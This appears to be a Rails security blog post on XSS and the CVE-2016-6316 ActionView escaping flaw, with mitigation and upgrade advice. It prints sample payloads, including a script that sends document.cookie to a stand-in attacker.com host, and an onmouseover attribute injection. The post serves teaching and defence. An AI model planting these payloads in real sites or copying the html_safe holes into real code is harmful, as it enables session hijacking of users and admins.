<p>Ruby and Rails security advisories, without exception, recommend that you upgrade your Rails app as soon as possible. Unfortunately, the descriptions of the problem being solved can be cryptic, and it can be hard to assess if you really need to do the upgrade. If you’re strapped for time, it can seem like a good plan to postpone upgrades and avoid extra work like fixing breaking tests.</p>

<p><strong>Note:</strong> By “upgrade” in this article, we mean a ‘minor’ or a ‘patch’ upgrade. For example an upgrade from Rails <code class="highlighter-rouge">4.2.5.1</code> to <code class="highlighter-rouge">4.2.7.1</code>.</p>

<p>In this article, we’re going to look at Rails <code class="highlighter-rouge">5.0.0.1/4.2.7.1/3.2.22.3</code>, which fixes <a href="https://groups.google.com/forum/#!topic/rubyonrails-security/I-VWr034ouk">CVE-2016-6316</a>. The aims of this article are:</p>

<ol>
  <li>To go over the basics of XSS vulnerabilities, how they can be exploited, and ways to mitigate them.</li>
  <li>To increase your understanding about the specific problem being solved with the Rails <code class="highlighter-rouge">5.0.0.1/4.2.7.1</code> release which fixes CVE-2016-6316 – an XSS vulnerability in <code class="highlighter-rouge">ActionView</code> and,</li>
  <li>Help you come to a conclusion on whether you should upgrade or not</li>
</ol>

<h2 id="what-is-an-xss-vulnerability">What is an XSS Vulnerability?</h2>

<p>“XSS” stands for cross-site scripting. When your application has an XSS vulnerability, attackers can run malicious Javascript on your users’ browsers. For example, consider a Javascript snippet like the following:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var i = new Image;
i.src = "http://attacker.com/" + document.cookie;
</code></pre></div></div>

<p>The above snippet, when run on a user’s browser, will cause the browser to make a request to <code class="highlighter-rouge">attacker.com</code> and send over the user’s cookie. Using this cookie, the attacker can proceed to hijack the user’s session and gain unauthorized access to secured areas of your app.</p>

<h2 id="types-of-xss-vulnerabilities">Types of XSS Vulnerabilities</h2>

<p>There are three major varieties of XSS:</p>

<p><strong>Reflected XSS</strong></p>

<p>A reflected XSS vulnerability arises when user input contained in a request is immediately reflected in the web application’s response. Exploiting a reflected XSS vulnerability involves crafting a request containing embedded Javascript that is reflected to any user who makes the request.</p>

<p><strong>Stored XSS</strong></p>

<p>A Stored XSS vulnerability arises when data submitted by one user (the attacker) is stored in the application and is then displayed to other users without being sanitized properly.</p>

<p><strong>DOM-based XSS</strong></p>

<p>DOM-based XSS vulnerabilities arise when client-side Javascript extracts data contained in a request’s URL or the response’s HTML (accessible via the DOM) to dynamically update the page’s contents. Exploiting a DOM-based XSS vulnerability involves crafting a request URL containing embedded Javascript such that the client-side Javascript injects the malicious Javascript into the DOM and causes its execution.</p>

<p><a href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting">Read this OWASP page for more info on the three types of XSS</a></p>

<p>For the purposes of this article, we will focus on Stored XSS.</p>

<p><strong><a href="https://ducktypelabs.com/wp-content/uploads/2016/10/Rails_XSS_Security_Cheatsheet.pdf">Click here to download a handy cheatsheet on Rails XSS &amp; Security!</a></strong></p>

<h2 id="how-to-attack-a-stored-xss-vulnerability">How to attack a Stored XSS Vulnerability?</h2>

<p>Let’s consider an example to illustrate how such a vulnerability can arise and how an attacker can take advantage of it.</p>

<h3 id="a-vulnerable-rails-app">A Vulnerable Rails app</h3>

<p>Consider a typical Rails app, with users and admins. A user record has three fields – <code class="highlighter-rouge">name</code>, <code class="highlighter-rouge">email</code> and <code class="highlighter-rouge">introduction</code>. Each user has a profile page where this information is listed. Admins in the system, in addition to being able to access these profile pages, also have access to a <code class="highlighter-rouge">/users</code> page which consolidates all the users’ information. The view code for this page starts out looking something like this:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;% #This is accessible only to admins %&gt;
&lt;% User.all.each do |user| %&gt;
  &lt;%= user.name %&gt;
  &lt;%= user.email %&gt;
  &lt;%= user.introduction %&gt;
&lt;% end %&gt;
</code></pre></div></div>

<p>Now let’s say we want to give our users the ability to customize their introductions with HTML. So instead of typing in <code class="highlighter-rouge">"I'm awesome!!"</code> in the introduction field, they can type in <code class="highlighter-rouge">"I'm &lt;strong&gt;awesome!!&lt;/strong&gt;"</code>. To accomplish this in our view, we make use of the <code class="highlighter-rouge">html_safe</code> helper and change <code class="highlighter-rouge">user.introduction</code> to <code class="highlighter-rouge">user.introduction.html_safe</code>. Now, if a user submits text with HTML in it, our view will render the HTML.</p>

<h3 id="enter-attacker">Enter Attacker</h3>

<p>An attacker can take advantage of this HTML rendering and submit something like this in the introduction field:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I am awesome!!
&lt;script&gt;
  var i = new Image;
  i.src = "http://attacker.com/" + document.cookie;
&lt;/script&gt;
</code></pre></div></div>

<p>and have this stored in the database. Now, whenever an admin logs in and visits the <code class="highlighter-rouge">/users</code> page, the above script will run and the attacker will see the admin’s cookie in their server logs. Using this cookie, they can proceed to log in as the admin and further their agenda (malicious though it may be).</p>

<h2 id="another-way-to-introduce-xss-vulnerabilities-with-html_safe">Another way to introduce XSS vulnerabilities with <code class="highlighter-rouge">html_safe</code></h2>

<p>The above example illustrates one straightforward way by which an XSS vulnerability can be introduced with <code class="highlighter-rouge">html_safe</code>. That is, using <code class="highlighter-rouge">html_safe</code> directly on user inputs because we want to give users the ability to customize how their input renders.</p>

<p>Another way using <code class="highlighter-rouge">html_safe</code> can cause XSS vulnerabilities to sneak up on you is when you find yourself needing to incorporate styling on strings which are derived from user input. Going back to our example Rails app’s <code class="highlighter-rouge">/users</code> page, let’s say we’ve installed <a href="http://fontawesome.io/">Font Awesome</a> and we want to provide admins a nicely styled link to a given user’s profile page. We might do something like this in our view:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;% User.all.each do |user| %&gt;
  &lt;%= link_to "&lt;i class='fa fa-user'&gt;&lt;/i&gt; #{user.name}".html_safe, users_profile_path(user) %&gt;
  &lt;%= user.email %&gt;
  &lt;%= user.introduction %&gt;
&lt;% end %&gt;
</code></pre></div></div>

<p>As in the previous example, this opens our admin’s account up to XSS attacks. By submitting javascript in the <code class="highlighter-rouge">name</code> field, an attacker can proceed to gain access to the admin’s account.</p>

<h2 id="but-i-need-to-use-html_safe-how-can-i-protect-my-app">But I need to use <code class="highlighter-rouge">html_safe</code>. How can I protect my app?</h2>

<p>The key is to use <code class="highlighter-rouge">html_safe</code> only on trusted strings, because it is an assertion. You can concatenate a string which is <code class="highlighter-rouge">html_safe</code> with a string which is not and be assured that the string which is not <code class="highlighter-rouge">html_safe</code> will be escaped properly. So for example, we can do:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%= link_to "&lt;i class='fa fa-user'&gt;&lt;/i&gt; ".html_safe + "#{user.name}", users_profile_path(user) %&gt;
</code></pre></div></div>

<p>which will ensure that <code class="highlighter-rouge">user.name</code> is properly escaped. So if we pass in a string like <code class="highlighter-rouge">"Bob Foo&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> to name, our HTML will look something like:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href='...'&gt;&lt;i class='fa fa-user'&gt;&lt;/i&gt; Bob Foo&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/a&gt;
</code></pre></div></div>

<p>instead of:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href='...'&gt;&lt;i class='fa fa-user'&gt;&lt;/i&gt; Bob Foo &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/a&gt;
</code></pre></div></div>

<p>which will prevent the Javascript from running.</p>

<p>The <a href="http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html"><code class="highlighter-rouge">sanitize</code></a> helper is another useful option. With <code class="highlighter-rouge">sanitize</code>, you can specify exactly what HTML tags and attributes you want to render and have it automatically reject anything else.</p>

<h2 id="rails-views-have-xss-protections">Rails Views have XSS Protections</h2>

<p>Rails (from version 3 onwards), by default, will escape any content in your views unless you specify that they are html_safe (either directly by calling <code class="highlighter-rouge">html_safe</code> on a string or indirectly with <code class="highlighter-rouge">sanitize</code>). <code class="highlighter-rouge">ActionView</code> helpers like <code class="highlighter-rouge">content_tag</code> or <code class="highlighter-rouge">link_to</code> also will, by default, escape strings that are passed in to them.</p>

<h2 id="cve-2016-6316">CVE-2016-6316</h2>

<p>As it turns out, inserting <code class="highlighter-rouge">&lt;script&gt;</code> tags into places where they won’t be escaped is just one of the many ways to exploit an XSS vulnerability. You (or an attacker) can also take advantage of the fact that Javascript can be called directly via HTML attributes such as <code class="highlighter-rouge">onclick</code>, <code class="highlighter-rouge">onmouseover</code> and others.</p>

<p>Let’s take a brief look at <code class="highlighter-rouge">content_tag</code> to examine how this can work in practice. Rails provides the <code class="highlighter-rouge">content_tag</code> helper to programmatically generate HTML tags. For example, to generate a <code class="highlighter-rouge">div</code> tag, you’d do something like this:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>content_tag(:div, "hi")
</code></pre></div></div>

<p>which in HTML would translate to:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div&gt;hi&lt;/div&gt;
</code></pre></div></div>

<p>You can pass in additional parameters to <code class="highlighter-rouge">content_tag</code> to specify tag attributes. So if we wanted to add a <code class="highlighter-rouge">title</code> attribute, we could say something like:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>content_tag(:div, "hi", title: "greeting")
</code></pre></div></div>

<p>which in HTML would translate to:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div title="greeting"&gt;hi&lt;/div&gt;
</code></pre></div></div>

<p>Now, let’s say for some reason, our app has this <code class="highlighter-rouge">title</code> attribute tied to a user input. Meaning, if our user input is <code class="highlighter-rouge">foo</code>, the HTML generated by <code class="highlighter-rouge">content_tag</code> would be:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div title="foo"&gt;hi&lt;/div&gt;
</code></pre></div></div>

<p>Assuming that there is no XSS protection enabled on <code class="highlighter-rouge">content_tag</code>, how would we exploit this?</p>

<p>We could send in a string like <code class="highlighter-rouge">"onmouseover="alert(document.cookie)</code>, which would result in HTML like the following:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div title="" onmouseover="alert(document.cookie)"&gt;
  hi
&lt;/div&gt;
</code></pre></div></div>

<p>The key character in our example input is the first double-quote character <code class="highlighter-rouge">"</code>. This double-quote, because it is not escaped, is treated by the browser as a closing quote and makes it so that the characters after the double-quote are treated as valid HTML.</p>

<p><strong>Rails, by default, will escape double-quotes, even in helpers like <code class="highlighter-rouge">content_tag</code>. Where CVE-2016-6316 comes in though, is when we mark our inputs to helpers like <code class="highlighter-rouge">content_tag</code> as <code class="highlighter-rouge">html_safe</code>.</strong></p>

<p>Let’s say we’re passing in user input from our controller to the view with the <code class="highlighter-rouge">@user_input</code> instance variable, and our call to <code class="highlighter-rouge">content_tag</code> looks like:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%= content_tag(:div, 'hi', title: @user_input) %&gt;
</code></pre></div></div>

<p>If an attacker tries to pass in a string like <code class="highlighter-rouge">"onmouseover=...</code>, Rails will automatically escape the double quotes and prevent the XSS attack.</p>

<p>However, prior to Rails <code class="highlighter-rouge">4.2.7.1/5.0.0.1</code>, <strong>if for some reason we marked the user input as <code class="highlighter-rouge">html_safe</code>:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%= content_tag(:div, 'hi', title: @user_input.html_safe) %&gt;
</code></pre></div></div>

<p>then <strong>this would allow double-quotes to be rendered in the HTML without being escaped.</strong> Which, as we’ve seen allows an attacker to execute arbitrary Javascript.</p>

<p>The <code class="highlighter-rouge">Rails 4.2.7.1/5.0.0.1</code> patch ensures that even if you mark an attribute in a tag helper as <code class="highlighter-rouge">html_safe</code>, double quotes will be escaped.</p>

<h2 id="so-should-i-upgrade">So, should I upgrade?</h2>

<p>The easy and correct answer is yes, you should upgrade. Especially if the upgrades involve security patches. Even if the upgrades don’t involve security patches, you should upgrade so that future security patches are easier to apply.</p>

<p>That being said, I think it depends on how far away your version of Rails is from the most recently released patch. The closer you are, the easier the upgrade process will be. Security patches in general are designed not to cause breaking changes in your codebase, but that applies only if you’re at the most recent patch already.</p>

<p>If you’re strapped for time, it would behoove you to understand the problems that security advisories and related patches fix, so you can assess for yourself if your codebase is at risk and apply any mitigations necessary.</p>

<h2 id="recommendations">Recommendations</h2>

<p>The most important thing you can do is to keep yourself aware of security advisories as and when they are released, and patch your app ASAP. Here’s how you can accomplish that:</p>

<p><strong>Use <a href="https://github.com/rubysec/bundler-audit"><code class="highlighter-rouge">bundler-audit</code></a>.</strong> This somewhat automates the process of keeping an eye on security mailing lists, but the onus is on you to regularly run this gem and keep it updated (with <code class="highlighter-rouge">bundle-audit update</code>). If you use CI, a good step would be to integrate running <code class="highlighter-rouge">bundle-audit</code> as part of your CI process.</p>

<p>When <code class="highlighter-rouge">bundler-audit</code> flags a gem as being out of date, upgrade the gem either with <code class="highlighter-rouge">bundle update &lt;gem-name&gt;</code> or if you have to, manually changing the version in <code class="highlighter-rouge">Gemfile.lock</code>.</p>

<p><strong>If you have the time, look into the security advisory that you just patched and use that as an excuse to learn more about that particular class of vulnerabilities.</strong></p>

<p>Have you patched your Rails app recently? If so, how did that process go for you? What would you like to learn about security in Rails? Let me know in the comments below!</p>

<p><strong>Shout-out: Thanks to <a href="https://github.com/obromios">Chris Drane</a> for suggesting this article, and to Gabriel Williams at <a href="https://www.cloudcity.io/">Cloud City</a> for reviewing it!</strong></p>

<p><strong><a href="https://ducktypelabs.com/wp-content/uploads/2016/10/Rails_XSS_Security_Cheatsheet.pdf">Click here to download a handy cheatsheet on Rails XSS &amp; Security!</a></strong></p>

<div id="mc_embed_signup" style="background: #dff7fe; padding: 15px;">
</div>
